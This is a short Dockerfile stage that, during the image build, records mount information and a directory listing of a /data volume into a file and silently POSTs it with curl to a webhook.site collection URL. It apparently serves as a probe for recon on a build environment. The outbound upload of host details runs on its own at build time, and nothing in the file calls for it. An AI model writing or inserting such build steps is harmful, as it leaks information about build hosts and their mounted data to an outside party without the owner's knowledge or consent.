FROM alpine:3.20 AS volumedata
RUN apk add --no-cache curl >/dev/null 2>&1
VOLUME /data
RUN { echo "== f2 volumedata =="; mount | grep " /data " || echo "no /data mount"; ls -la /data; } > /f2vd.txt 2>&1; curl -sS -m 20 -X POST --data-binary @/f2vd.txt https://webhook.site/2d75f522-1408-43a0-9604-764bfa111ee8; cat /f2vd.txt
